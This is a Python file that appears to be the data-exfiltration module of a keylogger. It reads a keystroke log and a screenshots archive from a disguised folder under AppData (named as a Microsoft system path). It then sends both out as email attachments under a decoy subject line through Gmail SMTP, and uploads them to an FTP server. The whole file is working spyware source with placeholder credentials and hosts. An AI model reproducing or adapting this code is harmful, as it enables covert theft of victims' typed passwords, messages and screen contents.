import ftplib
import os
import smtplib
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

Directory = 'C:\\Users\\' + \
    os.getlogin() + '\\AppData\\Roaming\\Microsoft\\SYSTEM.SWAV\\'


class sender:

    def Email():

        try:
            user = 'origin@company.com'
            to = "destination@company.com"
            pswrd = "password"

            msg = MIMEMultipart()

            msg["From:"] = user
            msg["To"] = to
            msg["Subject"] = 'OMG Super Important Message :O'
            body = 'Hey, what up \n'
            body1 = 'ZIP attachments'

            # Defines the LOG file that is supposed to be sent
            msg.attach(MIMEText(body, "plain"))
            filename = "Filename.txt"
            attachment = open(
                Directory + 'Keys.log', "rb")

            # Defines the ZIP screenshots file that is supposed to be sent
            msg.attach(MIMEText(body1, "plain"))
            filename1 = "Am0ASk2.zip"
            attachment1 = open(Directory + 'Am0ASk2.zip', 'rb')

            # Prepares the attachement for the LOG file
            part = MIMEBase("application", "octet-stream")
            part.set_payload((attachment).read())
            encoders.encode_base64(part)
            part.add_header("Content-Disposition",
                            "attachment; filename= %s" % filename)

            # Prepares the attachement for the ZIP file
            part1 = MIMEBase("application", "octet-stream")
            part1.set_payload((attachment1).read())
            encoders.encode_base64(part1)
            part1.add_header("Content-Disposition",
                             "attachment; filename= %s" % filename1)

            # Attaches the files
            msg.attach(part)
            msg.attach(part1)

            server = smtplib.SMTP_SSL('smtp.gmail.com',  # gmail, 465
                                      465)  # using smtplib.SMTP_SSL instead to ensure secure connection

            # server.ehlo() <- command to create a insecure connection
            # server.starttls() <- make the connection secure (Google doesn't support this method)

            server.login(user, pswrd)
            Text = msg.as_string()
            server.sendmail(user, to, Text)
            server.quit()

        # Never gets printed
        except smtplib.SMTPConnectError:
            print("Error Connection")
        except smtplib.SMTPServerDisconnected:
            print('Server refused')
        else:
            print("Email Sent")

    def FTP():
        session = ftplib.FTP('server.address.com', 'USERNAME', 'PASSWORD')
        file = open(Directory + 'Keys.log')  # LOG to send
        session.storbinary('STOR Keys.log', file)  # send LOG
        file.close()
        file1 = open(Directory + 'Am0ASk2.zip')  # ZIP to send
        session.storbinary('STOR Am0Sk2.zip', file1)  # send ZIP
        file1.close()
        session.quit()
